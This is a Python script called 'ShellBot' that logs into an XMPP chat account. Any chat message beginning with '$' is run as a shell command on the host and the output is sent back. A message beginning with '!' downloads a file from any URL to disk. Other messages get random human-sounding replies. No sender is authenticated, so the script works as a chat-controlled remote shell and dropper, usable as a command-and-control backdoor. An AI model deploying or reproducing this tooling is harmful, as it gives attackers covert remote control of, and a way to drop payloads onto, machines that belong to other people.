#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ShellBot v0.2
# Code heavily borrowed from SleekXMPP's MUCBot 
# https://github.com/fritzy/SleekXMPP/blob/develop/examples/muc.py

import time, random
import sys, os, subprocess
import logging
import getpass
import urllib2
from optparse import OptionParser
import sleekxmpp

# Requires a Google account user name that allows less secure apps.
# https://www.google.com/settings/security/lesssecureapps

USERNAME = 'example@gmail.com'
CMD_TOKEN = '$'
DWNLD_TOKEN = '!'

SERVICE_DISCOVERY = 'xep_0030'
MULTIUSER_CHAT = 'xep_0045'
XMPP_PING = 'xep_0199'

MESSAGES = ['what?', 'huh..', 'mmmmm', 'I don\'t get it']

#SHELLCHAT = ''
#SHELLNIC = ''

if sys.version_info < (3, 0):
  reload(sys)
  sys.setdefaultencoding('utf8')
else:
  raw_input = input

class MUCBot(sleekxmpp.ClientXMPP):

  def __init__(self, jid, password):  # , room, nick):
    sleekxmpp.ClientXMPP.__init__(self, jid, password)
    #self.room = room
    #self.nick = nick

    # The session_start event will be triggered when the bot connects to the server
    self.add_event_handler("session_start", self.start)

    #The message event is triggered whenever you are sent a message
    self.add_event_handler("message", self.message)

    # The groupchat_message event
    #self.add_event_handler("groupchat_message", self.muc_message)

    # The groupchat_presence event is triggered whenever someone joins a room
    #self.add_event_handler("muc::%s::got_online" % self.room, self.muc_online)

  # session_start event
  def start(self, event):
    self.get_roster()
    self.send_presence()
    #Don't join groupchat yet
    #self.plugin[MULTIUSER_CHAT].joinMUC(self.room, self.nick,
    #  password=room_password, wait=True)

  # reply to messages
  def message(self, msg):
    if msg['type'] in ('chat', 'normal'):
      body = msg['body']
      #Execute and respond to $command instructions
      if body and body[0] == CMD_TOKEN:
        reply = self.run_command(body.lstrip(CMD_TOKEN))
        msg.reply(reply).send()
        return
      #Execute and respond to !download instructions
      if body and body[0] == DWNLD_TOKEN:
        self.download(body.lstrip(DWNLD_TOKEN))
        savedToMsg = "file saved to: {}".format(
          body.lstrip(DWNLD_TOKEN).split('/')[-1])
        msg.reply(savedToMsg).send()
        return
      time.sleep(random.uniform(0.4, 2.45))
      reply = random.choice(MESSAGES)
      msg.reply(reply).send()

  # reply to nick_name mentions
  def muc_message(self, msg):
    if msg['mucnick'] != self.nick and self.nick in msg['body']:
      self.send_message(mto=msg['from'].bare,
                        mbody="I heard that, %s." % msg['mucnick'],
                        mtype='groupchat')

  #Announce when bot comes online
  def muc_online(self, presence):
    if presence['muc']['nick'] != self.nick:
      self.send_message(mto=presence['from'].bare,
                        mbody="Hello, %s %s" % (presence['muc']['role'],
                                                presence['muc']['nick']),
                        mtype='groupchat')

  def run_command(self, cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
      stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    return stdoutput

  #Grab our file from some url and save it to a file
  def download(self, url):
    req = urllib2.Request('%s' % (url))
    message = urllib2.urlopen(req)
    filename = url.split('/')[-1] #Keep file name consistent w/ file downloaded
    localFile = open(filename, 'w')
    localFile.write(message.read())
    localFile.close()


def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # JID and password options
  optp.add_option("-j", "--jid", dest="jid",
                  help="JID to use")
  optp.add_option("-p", "--password", dest="password",
                  help="password to use")
  #optp.add_option("-r", "--room", dest="room",
  #                help="MUC room to join")
  #optp.add_option("-n", "--nick", dest="nick",
  #                help="MUC nickname")

  opts, args = optp.parse_args()

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')

  if opts.jid is None:
    if USERNAME:
      opts.jid = USERNAME
    else:
      raise Exception("Username not set: use -j to set it.")
  if opts.password is None:
    opts.password = getpass.getpass("Password: ")
  #if opts.room is None:
  #    opts.room = raw_input("MUC room: ")
  #    opts.room = SHELLCHAT
  #if opts.nick is None:
  #    opts.nick = raw_input("MUC nickname: ")
  #    opts.nick = SHELLNIC

  # Setup the MUCBot and register plugins.
  xmpp = MUCBot(opts.jid, opts.password) #, opts.room, opts.nick)
  xmpp.register_plugin(SERVICE_DISCOVERY) # Service Discovery
  xmpp.register_plugin(MULTIUSER_CHAT) # Multi-User Chat
  xmpp.register_plugin(XMPP_PING) # XMPP Ping

  # Connect to the XMPP server and start processing XMPP stanzas.
  if xmpp.connect():
    #if xmpp.connect(('talk.google.com', 5222)):
    xmpp.process(block=True)
    print("Done")
  else:
    print("Unable to connect.")


if __name__ == '__main__':
  main()
